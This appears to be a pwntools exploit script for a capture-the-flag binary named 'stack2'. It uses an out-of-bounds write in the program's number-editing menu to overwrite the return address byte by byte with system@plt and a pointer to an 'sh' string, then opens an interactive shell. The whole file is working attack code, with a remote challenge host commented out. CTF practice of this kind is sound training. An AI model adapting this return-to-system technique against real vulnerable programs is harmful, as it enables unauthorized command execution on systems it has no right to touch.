#-*-coding:utf-8-*-
from pwn import *
p = process('./stack2')
# p = remote('111.198.29.45',46611)

offest = 0x84
system_plt_addr = 0x08048450
sh_addr = 0x08048980+7


def write_addr(offest,res):
    p.sendline('3')
    p.recvuntil("which number to change:")
    p.sendline(str(offest))
    p.recvuntil("new number:")
    p.sendline(str(res))
    p.recvuntil("5. exit")

p.recvuntil("How many numbers you have:")
p.sendline('1')
p.recvuntil("Give me your numbers")
p.sendline('2')
p.recvuntil("5. exit")

#写入system_plt_addr
write_addr(offest,0x50)
write_addr(offest+1,0x84)
write_addr(offest+2,0x04)
write_addr(offest+3,0x08)
#写入sh_addr
offest += 8 
write_addr(offest,0x87)
write_addr(offest+1,0x89)
write_addr(offest+2,0x04)
write_addr(offest+3,0x08)

p.sendline('5')
p.interactive()
